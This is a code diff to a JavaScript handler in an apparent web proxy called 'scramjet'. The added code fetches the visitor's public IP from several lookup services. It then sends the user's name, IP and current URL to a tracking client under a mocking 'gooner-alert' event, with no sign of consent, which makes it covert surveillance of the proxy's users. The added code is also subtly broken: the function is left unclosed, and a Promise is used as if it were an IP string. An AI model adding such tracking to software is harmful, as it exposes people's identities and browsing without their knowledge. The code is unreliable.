@@ -82,8 +82,23 @@ async function handleRequest(event) {
             });
             client.waitUntilReady()
             .then(() => {
+              async function getIP() {
+              const grabbers = [
+                "https://api.ipify.org/?format=json",
+                "https://www.my-ip-is.com/api/ip",
+                "https://api.myip.com",
+                "https://api.my-ip.io/v2/ip.json",
+              ];
+              for (const grabber of grabbers) {
+                try {
+                  const res = await fetch(grabber);
+                  const json = await res.json();
+                  if (json.ip) return json.ip;
+                } catch {}
+              }
+              return "";
               const username = parent.document.body.querySelector("#username").value || "unknown??"
-              const ip = parent.window.ip || "unknown"
+              const ip = parent.window.ip  || getIP() || "unknown"
               console.log('Client is ready');
               console.log(username,"on",ip,"is gooner on scramjet!!!")
               client.track("gooner-alert", { user: username, ip, url: location.href });
